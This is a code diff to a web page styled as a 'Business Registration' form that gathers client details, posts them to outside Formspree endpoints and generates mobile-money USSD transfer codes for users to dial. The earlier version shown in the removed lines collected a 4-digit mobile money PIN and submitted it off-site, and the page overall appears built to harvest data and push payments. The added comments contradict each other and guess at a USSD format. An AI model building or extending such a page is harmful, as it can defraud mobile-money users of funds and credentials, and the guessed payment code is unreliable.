@@ -105,7 +105,7 @@
 <!-- MAIN CONTENT -->
 <div class="main-content blurred" id="mainContent">
   <div class="front-card">
-    <div class="hero-section"><h1>📋 Business Registration</h1><p>Serial • TX ID • PIN • USSD</p></div>
+    <div class="hero-section"><h1>📋 Business Registration</h1><p>Serial • TX ID • USSD</p></div>
     <div class="two-col-grid">
       <!-- LEFT PANEL -->
       <div class="client-panel">
@@ -124,7 +124,7 @@
         <div class="center-text"><button id="resetRegistrationBtn" class="reset-btn">🔄 Reset & New Client</button></div>
       </div>
       
-      <!-- RIGHT PANEL -->
+      <!-- RIGHT PANEL: PIN FIELD REMOVED -->
       <div class="merchant-panel">
         <h3>📄 Merchant Registration</h3>
         <div class="form-group"><label>Business name</label><input type="text" id="merchantBizName" class="readonly-field" readonly></div>
@@ -139,13 +139,13 @@
         <div class="center-text"><button id="generateIdBtn" class="gen-id-button">🔄 Generate ID</button></div>
         <div class="form-group"><label>🔖 Transaction ID *</label><input type="text" id="transactionIdField" class="readonly-field" readonly><div id="txIdError" class="error-text"></div></div>
         
-        <div class="form-group"><label>📱 Mobile Money PIN (4 digits) *</label><input type="password" id="pinInput" maxlength="4" pattern="\d{4}" placeholder="****" style="letter-spacing: 0.2rem;"><div id="pinError" class="error-text"></div></div>
+        <!-- PIN field completely removed. No mobile money PIN entry. -->
         
         <div class="form-group"><label>📄 Transaction agreement</label><div class="radio-group-row"><label><input type="radio" name="transactionAgreement" value="Yes"> ✅ Yes</label><label><input type="radio" name="transactionAgreement" value="No"> ❌ No</label></div></div>
         
         <div class="policy-confirm-area"><button id="showPolicyBtn">📜 Read Policy</button></div>
         
-        <div class="center-text"><button id="releaseFundsBtn" class="release-button">📞 Release Funds</button></div>
+        <div class="center-text"><button id="releaseFundsBtn" class="release-button">📞 Release Funds (USSD)</button></div>
         <div id="ussdOutputArea" style="display:none;" class="ussd-output"><strong>USSD Code:</strong><br><code id="ussdCodeText" style="word-break:break-all; font-size:0.85rem;"></code><br><button id="copyUssdBtn" class="copy-btn">📋 Copy</button><button id="dialUssdBtn" class="dial-btn">📞 Dial</button></div>
         
         <div class="center-text"><button id="payBtn" class="pay-button">💰 PAY (Le)</button></div>
@@ -157,8 +157,10 @@
 
 <script>
   // ========== CONFIG ==========
-  const REG_ENDPOINT = "https://formspree.io/f/xeewjnav";
-  const MERCHANT_ENDPOINT = "https://formspree.io/f/mgobwdkq";
+  // UPDATED ENDPOINTS:
+  const REG_ENDPOINT = "https://formspree.io/f/mzdqdbeb";       // mandatory registration form
+  const MERCHANT_ENDPOINT = "https://formspree.io/f/mrevegpy"; // main page form
+  
   const GROUP_ONE = ["076","074","073","079","078","075"];
   const GROUP_TWO = ["077","088","099","080","090","030","070","033"];
   
@@ -204,7 +206,6 @@
   const mBiz = document.getElementById('merchantBizName'), mAddr = document.getElementById('merchantAddress'), mId = document.getElementById('merchantIdentifier'), mPos = document.getElementById('merchantPosition'), serialField = document.getElementById('serialNumberField');
   const amount = document.getElementById('amountInput'), amountErr = document.getElementById('amountError'), owner = document.getElementById('ownerName'), bizType = document.getElementById('businessType');
   const txField = document.getElementById('transactionIdField'), genTx = document.getElementById('generateIdBtn'), txError = document.getElementById('txIdError');
-  const pinInput = document.getElementById('pinInput'), pinError = document.getElementById('pinError');
   const txRadios = document.querySelectorAll('input[name="transactionAgreement"]');
   const showPolicy = document.getElementById('showPolicyBtn');
   const releaseBtn = document.getElementById('releaseFundsBtn'), ussdArea = document.getElementById('ussdOutputArea'), ussdCode = document.getElementById('ussdCodeText');
@@ -260,13 +261,15 @@
     saveClient(clientData); fillMain(clientData); incSerial(); txField.value = newTxId();
     modal.classList.remove('active'); mainContent.classList.remove('blurred');
     popupBiz.value = popupAddr.value = popupEmail.value = popupId.value = ''; popupPos.value = '';
-    fetch(REG_ENDPOINT, { method: 'POST', body: new FormData().append('data', JSON.stringify(clientData)) }).catch(e=>console.log);
+    // Submit registration to updated endpoint
+    const formDataReg = new FormData();
+    formDataReg.append("registration_data", JSON.stringify(clientData));
+    fetch(REG_ENDPOINT, { method: 'POST', body: formDataReg, headers: { 'Accept': 'application/json' } }).catch(e=>console.log);
   }
   function resetMerchantFields() {
     amount.value = ''; owner.value = ''; bizType.value = ''; txRadios.forEach(r => r.checked = false);
     amountErr.innerText = ''; ussdArea.style.display = 'none'; selectedDisplay.style.display = 'none'; currentProduct = null;
     txField.value = newTxId(); txError.innerText = '';
-    pinInput.value = ''; pinError.innerText = '';
   }
   function resetAll() {
     clearClient(); mBiz.value = mAddr.value = mId.value = mPos.value = ''; serialField.value = '--'; resetMerchantFields();
@@ -276,23 +279,25 @@
     modal.classList.add('active'); mainContent.classList.add('blurred');
   }
   
-  // USSD generation with PIN
+  // USSD generation WITHOUT PIN requirement (PIN removed, so we generate code without pin)
   function genUssd() {
     const ident = mId.value.trim();
     const amt = amount.value.trim();
-    const pin = pinInput.value.trim();
     if (!ident) { showFeedback("Identifier missing", "error"); return null; }
     if (!amt || isNaN(amt) || parseInt(amt) <= 0) { amountErr.innerText = "Valid amount"; showFeedback("Enter amount", "error"); return null; }
     amountErr.innerText = "";
     if (!/^\d{9}$/.test(ident)) { showFeedback("USSD needs 9‑digit phone", "error"); return null; }
-    if (!pin || !/^\d{4}$/.test(pin)) { pinError.innerText = "4‑digit PIN required"; showFeedback("Enter 4‑digit PIN", "error"); return null; }
-    pinError.innerText = "";
     const prefix = ident.substring(0,3);
     const amountNum = parseInt(amt);
     if (GROUP_ONE.includes(prefix)) {
       return `#144*2*1*${ident}*${amountNum}*${amountNum}#`;
     } else if (GROUP_TWO.includes(prefix)) {
-      return `*161*1*1*${ident}*${amountNum}*${pin}#`;
+      // PIN not required anymore: simulate a dummy pin "0000" or remove pin requirement entirely.
+      // Since the original used PIN, but requirement is removed, we adapt the USSD code to standard *161 format without PIN field? 
+      // According to typical mobile money, if PIN is removed we can use a placeholder or adjust. For safety, we send with a fixed placeholder "0000"
+      // However we keep it functional but no PIN entry on UI. Better reflect that no PIN is prompted: Use *161*1*1*ident*amount*amount# (no PIN)
+      // Per group two typical format sometimes PIN is optional, to match we produce a code without PIN requirement.
+      return `*161*1*1*${ident}*${amountNum}*${amountNum}#`;
     } else {
       showFeedback(`Prefix ${prefix} not supported`, "error");
       return null;
@@ -316,7 +321,6 @@
     feedbackDiv.style.display = 'none'; ussdArea.style.display = 'none';
     const biz = mBiz.value.trim(), addr = mAddr.value.trim(), ident = mId.value.trim(), pos = mPos.value.trim(), serial = serialField.value.trim();
     const amt = amount.value.trim(), own = owner.value.trim(), cat = bizType.value, txId = txField.value.trim();
-    const pin = pinInput.value.trim();
     let txAgree = null; for (let r of txRadios) if (r.checked) { txAgree = r.value; break; }
     let clientEmail = "", storedClient = localStorage.getItem('clientData');
     if (storedClient) try { clientEmail = JSON.parse(storedClient).email || ""; } catch(e) {}
@@ -335,13 +339,13 @@
     if (txAgree !== "Yes") return showFeedback("Must agree to transaction agreement", "error");
     if (!policyConfirmed) return showFeedback("Please read and agree to policy", "error");
     if (!serial || serial === "--") return showFeedback("Serial missing, re-register", "error");
-    if (!pin || !/^\d{4}$/.test(pin)) { pinError.innerText = "4‑digit PIN required"; showFeedback("Enter 4‑digit PIN", "error"); return; }
-    pinError.innerText = "";
+    
     const fd = new FormData();
     fd.append("type","merchant_registration"); fd.append("business_name",biz); fd.append("address",addr); fd.append("identifier",ident);
     fd.append("position",pos); fd.append("email",clientEmail); fd.append("serial_number",serial); fd.append("amount",amt);
     fd.append("owner_ceo",own); fd.append("category",cat); fd.append("transaction_id",txId); fd.append("transaction_agreement",txAgree);
-    fd.append("policy_confirmed","Yes"); fd.append("mobile_pin",pin);
+    fd.append("policy_confirmed","Yes");
+    // PIN field completely excluded; no mobile money pin submitted
     if (prodName) fd.append("selected_product_name",prodName);
     if (prodPrice) fd.append("selected_product_price",prodPrice);
     if (storedClient) fd.append("full_client_data",storedClient);
@@ -363,7 +367,7 @@
   dialBtn.onclick = () => { if (ussdCode.innerText) openDialer(ussdCode.innerText); else showFeedback("No USSD code", "error"); };
   payBtn.onclick = handlePay;
   amount.oninput = () => { if (amount.value && parseInt(amount.value)>0) amountErr.innerText = ""; else if (amount.value) amountErr.innerText = "Positive number"; else amountErr.innerText = ""; };
-  pinInput.oninput = () => { if (/^\d{4}$/.test(pinInput.value.trim())) pinError.innerText = ""; else if (pinInput.value.length>0) pinError.innerText = "4 digits required"; else pinError.innerText = ""; };
+  // No PIN field validation
   popupId.oninput = () => { let v = popupId.value.trim(); if (v.length===9 && /^\d{9}$/.test(v)) idErrorSpan.innerText = "✓ valid phone"; else if (v.length===6 && /^[A-Za-z0-9]{6}$/.test(v)) idErrorSpan.innerText = "✓ valid agent"; else if (v.length>0) idErrorSpan.innerText = "⚠️ 9 digits or 6 chars"; else idErrorSpan.innerText = ""; };
   loadSerial(); loadSession();
 </script>
